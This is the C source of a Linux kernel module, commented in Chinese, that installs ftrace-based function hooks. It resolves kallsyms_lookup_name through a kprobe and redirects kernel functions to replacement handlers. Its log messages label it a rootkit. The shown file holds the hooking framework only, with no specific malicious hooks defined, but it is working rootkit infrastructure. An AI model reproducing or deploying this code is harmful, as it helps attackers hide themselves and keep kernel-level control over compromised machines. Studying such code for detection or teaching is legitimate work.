#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

/*
*我们需要内核函数的原始地址才能HOOK，所以第一步需要通过kallsyms（所有内核符号的列表）来获取所需函数的地址。
*内核版本5.7以上，无法通过kallsyms_lookup_name函数导出，我们可以使用kprobe进行导出符号表。
*/

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
#endif

#define HOOK(_name, _hook, _orig)   \
{                                   \
    .name = (_name),                \
    .function = (_hook),            \
    .original = (_orig),            \
}

/*
* 通过设置USE_FENTRY_OFFSET=0。访问在hook的时候陷入递归循环
*/

#define USE_FENTRY_OFFSET 1
// #if !USE_FENTRY_OFFSET
// #pragma GCC optimize("-fno-optimize-sibling-calls")
// #endif



/*
* ftrace_hook的数据结构
* name 为需要hook的函数名
* function 为替换hook函数的新逻辑地址
* original 原函数逻辑的地址
*/
struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
};

/* 
 * 获取钩子函数地址
 * */
static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
#ifdef KPROBE_LOOKUP
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
    printk(KERN_INFO "rootkit: kprobe at %p\n", kp.addr);
    // printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook->name);
#endif
    hook->address = kallsyms_lookup_name(hook->name);
    printk(KERN_INFO "rootkit: symbol:%s at pointer:%p\n", hook->name, hook->address);
    if (!hook->address)
    {
        printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }

#if USE_FENTRY_OFFSET
    *((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
    *((unsigned long*) hook->original) = hook->address;
#endif

    return 0;
}

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

#if USE_FENTRY_OFFSET
    regs->ip = (unsigned long) hook->function;
#else
    if(!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->function;
#endif
}


int fh_install_hook(struct ftrace_hook *hook)
{
    int err;
    err = fh_resolve_hook_address(hook);
    if(err)
        return err;

    /*
    * 使用ftrace封装的API进行注册钩子函数
    * ftrace_set_filter_ip,register_ftrace_function
    */

    hook->ops.func = fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
            | FTRACE_OPS_FL_RECURSION_SAFE
            | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
        return err;
    }

    return 0;
}

/*
 * 卸载钩子函数
 * */
void fh_remove_hook(struct ftrace_hook *hook)
{
    int err;
    err = unregister_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
    }
}


int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
    int err;
    size_t i;

    for (i = 0 ; i < count ; i++)
    {
        err = fh_install_hook(&hooks[i]);
        if(err)
            goto error;
    }
    return 0;

error:
    while (i != 0)
    {
        fh_remove_hook(&hooks[--i]);
    }
    return err;
}

void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
    size_t i;
    for (i = 0 ; i < count ; i++){
        fh_remove_hook(&hooks[i]);
    }

// #ifdef KPROBE_LOOKUP
//     unregister_kprobe(&kp);
// #endif
}